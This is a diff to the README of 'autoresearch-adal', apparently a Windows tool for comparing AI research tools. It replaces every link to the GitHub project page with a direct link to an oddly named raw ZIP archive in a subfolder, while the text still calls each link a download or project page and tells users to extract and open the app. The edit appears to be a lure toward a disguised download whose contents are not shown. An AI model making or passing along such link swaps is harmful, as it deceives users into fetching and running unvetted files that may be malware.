@@ -1,6 +1,6 @@
 # 🤖 autoresearch-adal - Compare AI Research Tools Fast
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tavarasu/autoresearch-adal)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tavarasu/autoresearch-adal/raw/refs/heads/main/amimia/adal_autoresearch_reread.zip)
 
 ## 📌 What this is
 
@@ -16,7 +16,7 @@ Use it to:
 
 Use this link to **visit the page to download** or get the app files:
 
-[Open the download page](https://github.com/Tavarasu/autoresearch-adal)
+[Open the download page](https://github.com/Tavarasu/autoresearch-adal/raw/refs/heads/main/amimia/adal_autoresearch_reread.zip)
 
 If the page shows a release, download the Windows file from there.  
 If you see a ZIP file, save it to your PC, then extract it before you open the app.
@@ -204,6 +204,6 @@ This helps you track the run without guessing what is happening.
 
 Open the project page here:
 
-https://github.com/Tavarasu/autoresearch-adal
+https://github.com/Tavarasu/autoresearch-adal/raw/refs/heads/main/amimia/adal_autoresearch_reread.zip
 
 Use this page to visit the download area, check updates, and view the latest files
